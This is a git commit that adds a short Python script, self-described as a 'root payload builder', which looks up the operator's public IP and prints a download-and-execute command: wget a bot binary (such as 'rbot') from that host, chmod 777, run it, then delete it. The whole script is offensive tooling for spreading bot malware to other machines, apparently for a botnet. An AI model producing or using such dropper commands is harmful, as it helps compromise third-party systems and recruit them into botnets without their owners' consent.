0335472389c27bb79b91540a98d7ae202758fd96
Grim <77136845+joysticks@users.noreply.github.com>
2024-09-12 14:06:16 -0700

    Add files via upload

---
+++ root.py
@@ -0,0 +1,22 @@
+#Grim's root payload builder
+#usage: python3 root.py
+import os, urllib.request
+
+os.system("clear")
+ipaddr = urllib.request.urlopen('http://api.ipify.org').read().decode("utf-8")
+
+def makepayload():
+	os.system("clear")
+	print(f"Your ROOT Payload: wget http://"+ipaddr+"/"+binFolder+"/"+binName+"; chmod 777 *; ./"+binName+"; rm -rf "+binName+"\n")
+
+def dread():
+	os.system("clear")
+	print(f"Your ROOT Payload: wget http://"+ipaddr+"/botpilled/rbot; chmod 777 *; ./rbot; rm -rf rbot\n")
+
+source = input("Are you using RBOT/Dread? y/n: ")
+if source == "y":
+	dread()
+else:
+	binFolder = input("Enter Bin Folder Name: ")
+	binName = input("Enter x86 Bin Name: ")
+	makepayload()
